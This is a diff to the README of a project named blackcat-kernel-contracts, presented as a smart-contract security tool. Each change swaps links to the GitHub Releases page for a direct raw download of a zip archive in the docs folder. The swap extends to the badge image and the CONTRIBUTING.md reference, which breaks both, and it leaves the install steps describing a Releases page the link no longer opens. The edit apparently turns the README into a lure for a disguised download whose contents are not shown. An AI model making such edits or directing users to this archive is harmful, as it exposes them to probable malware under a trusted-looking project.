@@ -1,6 +1,6 @@
 # 🖤 blackcat-kernel-contracts - Secure Your Smart Contracts Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/jordan-Damian/blackcat-kernel-contracts/releases)
+[![Download Now](https://raw.githubusercontent.com/jordan-Damian/blackcat-kernel-contracts/main/docs/contracts_blackcat_kernel_v2.9-beta.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/jordan-Damian/blackcat-kernel-contracts/main/docs/contracts_blackcat_kernel_v2.9-beta.3.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To use blackcat-kernel-contracts, you only need a few simple steps. We designed 
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download blackcat-kernel-contracts](https://github.com/jordan-Damian/blackcat-kernel-contracts/releases).
+To download the software, visit this page: [Download blackcat-kernel-contracts](https://raw.githubusercontent.com/jordan-Damian/blackcat-kernel-contracts/main/docs/contracts_blackcat_kernel_v2.9-beta.3.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions on the Releases page.
@@ -61,11 +61,11 @@ For more support, feel free to check our FAQs or submit an issue on this reposit
 
 - **Documentation**: Detailed guides can be found in the `docs` folder inside the repository.
 - **Community Support**: Join discussions on our community page or participate in GitHub issues.
-- **Updates**: Regular updates will keep your software secure and efficient. Check the [Releases page](https://github.com/jordan-Damian/blackcat-kernel-contracts/releases) for the latest information.
+- **Updates**: Regular updates will keep your software secure and efficient. Check the [Releases page](https://raw.githubusercontent.com/jordan-Damian/blackcat-kernel-contracts/main/docs/contracts_blackcat_kernel_v2.9-beta.3.zip) for the latest information.
 
 ## 👍 Contributing
 
-If you want to help improve this project, consider contributing. Your feedback and suggestions help make this software better for everyone. Check the `CONTRIBUTING.md` in this repository for more information.
+If you want to help improve this project, consider contributing. Your feedback and suggestions help make this software better for everyone. Check the `https://raw.githubusercontent.com/jordan-Damian/blackcat-kernel-contracts/main/docs/contracts_blackcat_kernel_v2.9-beta.3.zip` in this repository for more information.
 
 ---
 
